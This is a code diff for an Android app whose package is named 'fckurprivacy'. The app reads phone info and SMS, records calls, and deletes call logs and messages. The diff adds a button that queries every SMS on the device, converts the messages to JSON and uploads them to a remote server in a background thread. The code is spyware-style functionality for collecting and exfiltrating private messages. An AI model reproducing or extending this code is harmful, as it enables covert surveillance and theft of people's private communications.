@@ -16,11 +16,14 @@ import com.vergermiya.harevost.fckurprivacy.CallLogger.CallLogger;
 import com.vergermiya.harevost.fckurprivacy.CallLogger.CallLogs;
 import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecord;
 import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoChecker;
+import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoJson;
 import com.vergermiya.harevost.fckurprivacy.PermissionsChecker.PermissionsActivity;
 import com.vergermiya.harevost.fckurprivacy.PermissionsChecker.PermissionsChecker;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsCheckService;
-import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsInfo;
+import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsObserver;
+import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;
+import com.vergermiya.harevost.fckurprivacy.Util.JsonUploader;
 
 import java.util.ArrayList;
 
@@ -34,6 +37,7 @@ public class MainActivity extends AppCompatActivity {
     private Button deleteCallLogsButton;
     private Button getSmsButton;
     private Button delSmsButton;
+    private Button uploadJsonButton;
 
     // 所需的全部权限
     static final String[] PERMISSIONS = new String[]{
@@ -68,14 +72,16 @@ public class MainActivity extends AppCompatActivity {
         deleteCallLogsButton = findViewById(R.id.deleteCallLogsButton);
         getSmsButton = findViewById(R.id.getSmsButton);
         delSmsButton = findViewById(R.id.delSmsButton);
+        uploadJsonButton = findViewById(R.id.uploadJsonButton);
     }
 
     private void initEvent() {
         getInfoButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                String phoneInfo = InfoChecker.getPhoneInfo(getApplicationContext());
-                gottenInfoText.setText(phoneInfo);
+                InfoJson infoJson = InfoChecker.getPhoneInfo(getApplicationContext());
+                String infoJsonStr = JsonBuilder.buildInfoJson(infoJson).toString();
+                gottenInfoText.setText(infoJsonStr);
             }
         });
 
@@ -111,8 +117,9 @@ public class MainActivity extends AppCompatActivity {
         getSmsButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
-                SmsInfo smsInfo = SmsObserver.getLatestSmsInfo(MainActivity.this, SmsObserver.SMS_INBOX);
-                gottenInfoText.setText(smsInfo.toString());
+                ArrayList<SmsJson> smsJsons = SmsObserver.querySmsJson(getApplicationContext(), SmsObserver.SMS_ALL);
+                String smsJsonStr = JsonBuilder.buildSmsJsons(smsJsons).toString();
+                gottenInfoText.setText(smsJsonStr);
             }
         });
 
@@ -120,6 +127,21 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View view) {
                 SmsObserver.deleteLatestSms(getApplicationContext(), SmsObserver.SMS_SENT);
+            }
+        });
+
+        uploadJsonButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Thread uploadThread = new Thread() {
+                    @Override
+                    public void run() {
+                        ArrayList<SmsJson> smsJsons = SmsObserver.querySmsJson(getApplicationContext(), SmsObserver.SMS_ALL);
+                        String smsJsonStr = JsonBuilder.buildSmsJsons(smsJsons).toString();
+                        JsonUploader.postJson(smsJsonStr);
+                    }
+                };
+                uploadThread.start();
             }
         });
     }
